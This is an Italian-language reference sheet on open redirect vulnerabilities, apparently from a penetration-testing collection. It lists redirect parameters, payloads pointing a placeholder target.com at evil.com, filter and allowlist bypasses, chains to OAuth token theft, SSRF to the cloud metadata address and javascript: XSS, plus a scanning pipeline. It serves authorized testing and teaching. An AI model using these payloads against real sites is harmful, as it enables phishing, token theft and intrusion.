# 🔀 Scheda di riferimento sugli open redirect

<!-- language-home-navigation -->
[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
   ██████╗ ██████╗ ███████╗███╗   ██╗    ██████╗ ███████╗██████╗ ██╗██████╗ ███████╗ ██████╗████████╗
  ██╔═══██╗██╔══██╗██╔════╝████╗  ██║    ██╔══██╗██╔════╝██╔══██╗██║██╔══██╗██╔════╝██╔════╝╚══██╔══╝
  ██║   ██║██████╔╝█████╗  ██╔██╗ ██║    ██████╔╝█████╗  ██║  ██║██║██████╔╝█████╗  ██║        ██║   
  ██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║    ██╔══██╗██╔══╝  ██║  ██║██║██╔══██╗██╔══╝  ██║        ██║   
  ╚██████╔╝██║     ███████╗██║ ╚████║    ██║  ██║███████╗██████╔╝██║██║  ██║███████╗╚██████╗   ██║   
   ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝    ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝   ╚═╝   
```

> **Nota sugli esempi:** interpretazione degli URL, codifica e gestione degli schemi dipendono da parser, browser e validazione. `evil.target.com` è un sottodominio di `target.com` e non è necessariamente controllato dall’attaccante. Le catene OAuth/SSRF/XSS richiedono ulteriori condizioni; un open redirect non le dimostra da solo. Vedi la [descrizione PortSwigger](https://portswigger.net/kb/issues/00500100_open-redirection-reflected).

---

## 🎯 Che cos'è un open redirect

Una vulnerabilità **open redirect** consente agli attaccanti di reindirizzare gli utenti verso siti malevoli attraverso domini considerati affidabili; può essere usata per il phishing o concatenata con altre vulnerabilità.

---

## 🔍 Parametri comuni

```
url=
redirect=
redirect_uri=
redirect_url=
next=
next_url=
return=
return_url=
rurl=
dest=
destination=
redir=
redirect_uri=
return_to=
checkout_url=
continue=
image_url=
go=
view=
to=
out=
ref=
callback=
```

---

## 💉 Payload

### Di base
```
https://target.com/redirect?url=https://evil.com
https://target.com/redirect?url=http://evil.com
https://target.com/redirect?url=//evil.com
```

### Senza protocollo esplicito
```
//evil.com
///evil.com
////evil.com
/\/evil.com
```

### Uso del simbolo @
```
https://target.com@evil.com
https://target.com%40evil.com
//target.com@evil.com
```

### Espedienti con la barra inversa
```
https://evil.com\@target.com
//evil.com\@target.com
https://target.com/redirect?url=https://evil.com\.target.com
```

### Codifica URL
```
https://evil.com
https:%2f%2fevil.com
https:%252f%252fevil.com
%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d
```

### Confusione tra domini
```
https://evil.com?.target.com
https://evil.com#.target.com
https://evil.com\.target.com
https://target.com.evil.com
https://targetcom.evil.com
```

### Byte nulli
```
https://evil.com%00.target.com
https://evil.com%00@target.com
```

### CRLF Injection
```
https://target.com/redirect?url=%0d%0aLocation:%20https://evil.com
```

### Reindirizzamento JavaScript
```
javascript:alert(1)
javascript://target.com/%0d%0aalert(1)
data:text/html,<script>location='https://evil.com'</script>
```

---

## 🛡 Tecniche di aggiramento

### Se viene controllato un elenco di domini consentiti
```
# Aggiramento basato sui sottodomini
https://target.com.evil.com
https://evil.target.com
https://targetcom.evil.com

# Aggiramento basato sul percorso
https://target.com/https://evil.com
https://target.com//evil.com
```

### Se è consentito soltanto HTTPS
```
https://evil.com
https://evil.com%2f%2ftarget.com
```

### Espedienti con localhost
```
http://localhost
http://127.0.0.1
http://[::1]
```

---

## 🔗 Concatenazione degli open redirect

### Furto di token OAuth
```
https://target.com/oauth?redirect_uri=https://evil.com
→ Furto di token OAuth
```

### Catena SSRF
```
https://target.com/redirect?url=http://169.254.169.254/
```

### Catena XSS
```
https://target.com/redirect?url=javascript:alert(document.domain)
```

---

## 📊 Riferimento rapido

| Tipo di payload | Esempio |
| -------------- | --------- |
| Di base | `//evil.com` |
| Simbolo @ | `https://target.com@evil.com` |
| Codifica | `https:%2f%2fevil.com` |
| Confusione tra domini | `https://target.com.evil.com` |
| JavaScript | `javascript:alert(1)` |

---

## 🛠 Strumenti

```bash
# Pattern GF
gau target.com | gf redirect

# Test manuali
echo "https://target.com/r?url=FUZZ" | \
  qsreplace "https://evil.com" | \
  httpx -silent -location
```

---

## 📚 Risorse

- [PortSwigger Open Redirect](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect)

---

<p align="center">
  <b>🔀 Verifica i reindirizzamenti!</b><br>
  <i>Solo per test autorizzati!</i>
</p>
